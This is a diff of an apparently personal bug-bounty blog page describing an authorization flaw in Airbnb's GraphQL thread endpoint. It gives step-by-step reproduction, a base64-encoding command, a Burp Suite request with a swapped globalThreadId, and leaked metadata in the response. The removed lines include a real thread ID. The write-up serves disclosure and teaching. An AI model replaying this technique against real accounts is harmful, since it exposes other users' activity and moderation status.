@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Airbnb Thread Metadata Disclosure — Ahan Pahlevi</title>
+  <title>GraphQL Thread Metadata Disclosure — Airbnb | Ahan Pahlevi</title>
   <link rel="icon" href="../assets/favicon.ico" />
   <link rel="stylesheet" href="../css/style.css" />
 </head>
@@ -53,97 +53,111 @@
           While exploring Airbnb's support message system, I discovered that an authenticated user
           can access partial metadata of another user's support thread by manipulating the
           <code>globalThreadId</code> parameter in the <code>ViaductGetThreadAndDataQuery</code>
-          GraphQL endpoint. Although the report was closed as informative by Airbnb Security,
-          the finding demonstrates a real authorization inconsistency worth documenting.
+          GraphQL endpoint. The server returns <code>HTTP 200</code> with thread metadata
+          belonging to other users, instead of a proper <code>HTTP 403</code> Forbidden response.
         </p>
 
         <blockquote>
-          Airbnb Response: "Being able to know if a user has an active conversation does not
-          appear to pose a security risk." — Airbnb Security Team
+          "Being able to know if a user has an active conversation does not appear to pose a
+          security risk." — Airbnb Security Team (Closed as Informative)
         </blockquote>
 
         <h2>Vulnerability Summary</h2>
         <p>
-          The server returns <code>HTTP 200</code> with partial thread metadata belonging to
-          other users when an unauthorized <code>globalThreadId</code> is supplied — instead
-          of returning a clean <code>HTTP 403</code>. Message content itself is protected,
-          but metadata leaks include:
+          Although message content is properly protected, the endpoint leaks the following
+          metadata when supplied with an unauthorized <code>globalThreadId</code>:
         </p>
         <ul style="padding-left:1.5rem;margin-bottom:1.2rem;color:var(--text-dim);">
           <li>Thread ID & existence confirmation</li>
-          <li>Inbox visibility status (<code>hiddenInInbox</code>) → reveals moderation status</li>
+          <li>Inbox visibility status (<code>hiddenInInbox</code>) — reveals account moderation status</li>
           <li>Activity timestamps (<code>mostRecentInboxActivityAtMsFromROS</code>)</li>
           <li>Profile images of support participants</li>
         </ul>
 
         <h2>Steps to Reproduce</h2>
 
-        <p><strong>Step 1</strong> — Siapkan dua akun Airbnb:</p>
+        <p><strong>Step 1 — Setup two Airbnb accounts:</strong></p>
         <pre><code>Account A → Attacker
-Account B → Victim</code></pre>
+Account B → Victim (test account)</code></pre>
 
-        <p><strong>Step 2</strong> — Login sebagai Account B, buka support chat dan catat thread ID dari URL:</p>
-        <pre><code>https://www.airbnb.com/guest/messages/2472328079
-                                              ^^^^^^^^^^
-                                              Thread ID</code></pre>
+        <p><strong>Step 2 — Get victim's thread ID from URL:</strong></p>
+        <p>
+          Login as Account B, open support chat and note the thread ID from the URL.
+        </p>
+        <img src="../assets/screenshot_3_victim_thread_url.png"
+          alt="Victim Thread URL"
+          style="width:100%;border-radius:8px;border:1px solid var(--border);margin:0.5rem 0 1.5rem;" />
 
-        <p><strong>Step 3</strong> — Login sebagai Account A, intercept traffic dengan Burp Suite.
-        Browse ke halaman support untuk trigger request:</p>
-        <pre><code>GET /api/v3/ViaductGetThreadAndDataQuery</code></pre>
+        <p><strong>Step 3 — Encode the thread ID to Base64:</strong></p>
+        <pre><code>$ echo -n "MessageThread:[REDACTED]" | base64
+[REDACTED_BASE64]</code></pre>
+        <img src="../assets/screenshot_4_base64_decode_terminal.png"
+          alt="Base64 Encoding in Terminal"
+          style="width:100%;border-radius:8px;border:1px solid var(--border);margin:0.5rem 0 1.5rem;" />
 
-        <p><strong>Step 4</strong> — Encode thread ID milik victim ke Base64:</p>
-        <pre><code>$ echo -n "MessageThread:2472328079" | base64
-TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5</code></pre>
+        <p><strong>Step 4 — Intercept & modify the request in Burp Suite:</strong></p>
+        <p>
+          Login as Account A, intercept the <code>ViaductGetThreadAndDataQuery</code> request,
+          replace the <code>globalThreadId</code> value with the encoded victim thread ID,
+          and send via Repeater.
+        </p>
+        <img src="../assets/screenshot_1_repeater_request.png"
+          alt="Burp Suite Repeater Request"
+          style="width:100%;border-radius:8px;border:1px solid var(--border);margin:0.5rem 0 1.5rem;" />
 
-        <p><strong>Step 5</strong> — Di Burp Repeater, ganti nilai <code>globalThreadId</code>
-        dengan encoded thread ID milik victim, lalu send:</p>
+        <p><strong>Step 5 — Server returns HTTP 200 instead of 403:</strong></p>
+        <img src="../assets/screenshot_2_response_200_metadata.png"
+          alt="HTTP 200 Response"
+          style="width:100%;border-radius:8px;border:1px solid var(--border);margin:0.5rem 0 1.5rem;" />
+
+        <p><strong>Step 6 — Metadata of Account B leaked in response body:</strong></p>
+        <img src="../assets/screenshot_5_response_body_metadata_leaked.png"
+          alt="Leaked Metadata in Response Body"
+          style="width:100%;border-radius:8px;border:1px solid var(--border);margin:0.5rem 0 1.5rem;" />
+
+        <h2>Proof of Concept</h2>
         <pre><code>GET /api/v3/ViaductGetThreadAndDataQuery/d8dbf8f7...
   ?operationName=ViaductGetThreadAndDataQuery
-  &variables={"globalThreadId":"TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5"...}
-Cookie: [Account A session]</code></pre>
+  &variables={"globalThreadId":"[REDACTED_BASE64]"...}
+Cookie: [Account A session]
 
-        <h2>Response (HTTP 200 — Data Leak)</h2>
-        <pre><code>{
+--- Response ---
+HTTP/2 200 OK
+{
   "data": {
     "threadData": {
-      "id": "TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5",
+      "id": "[REDACTED]",
       "hiddenInInbox": true,
       "inboxAccessibilityTemplateText": "You do not have access to this thread.",
       "inboxProfileImages": [...],
       "mostRecentInboxActivityAtMsFromROS": "0",
-      "fetchedAt": "1773610116970"
+      "fetchedAt": "[REDACTED]"
     }
   }
 }</code></pre>
 
-        <p>
-          Server mengembalikan <code>HTTP 200</code> dengan metadata thread milik Account B,
-          padahal Account A tidak memiliki akses. Inkonsistensi ini terjadi karena authorization
-          check hanya diterapkan pada level konten pesan, bukan pada level GraphQL resolver metadata.
-        </p>
-
         <h2>Impact Analysis</h2>
-        <p>Meskipun konten pesan terlindungi, metadata yang bocor dapat digunakan untuk:</p>
+        <p>Although message content is protected, the leaked metadata can be used to:</p>
         <ul style="padding-left:1.5rem;margin-bottom:1.2rem;color:var(--text-dim);">
-          <li><strong>User profiling</strong> — konfirmasi apakah user memiliki support conversation aktif</li>
-          <li><strong>Moderation enumeration</strong> — <code>hiddenInInbox: true</code> mengindikasikan akun sedang dalam review</li>
-          <li><strong>Activity pattern analysis</strong> — timestamp aktivitas support terakhir bocor</li>
-          <li><strong>Attack chaining</strong> — enumerasi valid thread ID untuk serangan lanjutan</li>
+          <li><strong>Confirm user activity</strong> — verify if a target has active support conversations</li>
+          <li><strong>Enumerate moderation status</strong> — <code>hiddenInInbox: true</code> indicates account under review</li>
+          <li><strong>Profile activity patterns</strong> — support activity timestamps are exposed</li>
+          <li><strong>Attack chaining</strong> — valid thread IDs can be enumerated for further exploitation</li>
         </ul>
 
         <h2>Remediation</h2>
         <ul style="padding-left:1.5rem;margin-bottom:1.2rem;color:var(--text-dim);">
-          <li>Return <code>HTTP 403</code> untuk seluruh request ketika user tidak terotorisasi</li>
-          <li>Validasi thread ownership di server-side sebelum mengembalikan field apapun</li>
-          <li>Implementasi consistent authorization check di semua GraphQL field resolver</li>
+          <li>Return <code>HTTP 403</code> for the entire request when user is not authorized — do not return partial data</li>
+          <li>Validate thread ownership server-side before returning ANY field in the response</li>
+          <li>Implement consistent authorization checks across all GraphQL field resolvers</li>
         </ul>
 
         <h2>Lessons Learned</h2>
         <blockquote>
-          Tidak semua temuan diterima sebagai valid vulnerability — dan itu wajar.
-          Yang penting adalah proses: enumerasi endpoint, analisis response behavior,
-          dan pelaporan yang terstruktur. Metadata disclosure sering dianggap low severity,
-          tapi dalam konteks yang tepat bisa menjadi bagian dari attack chain yang lebih besar.
+          Not every finding gets accepted — and that's part of bug bounty. What matters is
+          the process: endpoint enumeration, response behavior analysis, and structured reporting.
+          Metadata disclosure is often underrated, but in the right context it can be a stepping
+          stone for a larger attack chain. Keep hunting.
         </blockquote>
 
         <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:1.5rem;">
@@ -153,6 +167,7 @@ Cookie: [Account A session]</code></pre>
           <span class="skill-badge">Authorization Bypass</span>
           <span class="skill-badge">Metadata Disclosure</span>
           <span class="skill-badge">HackerOne</span>
+          <span class="skill-badge">Airbnb</span>
         </div>
 
       </div>
